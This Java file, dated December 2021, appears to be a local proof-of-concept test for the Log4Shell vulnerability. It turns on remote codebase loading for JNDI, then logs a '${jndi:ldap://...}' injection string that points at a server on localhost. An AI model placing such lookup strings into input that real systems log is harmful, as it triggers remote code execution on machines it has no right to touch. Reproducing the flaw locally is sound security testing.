package com.spring.smpor.common.util;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @Description:
 * @Auther: fanlz
 * @Date: 2021/12/11 11:29
 */
public class log4j2 {
    private static final Logger logger = LogManager.getLogger(log4j2.class);
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("params:{}","${jndi:ldap://127.0.0.1:18088/Log4jTest}");
    }
}
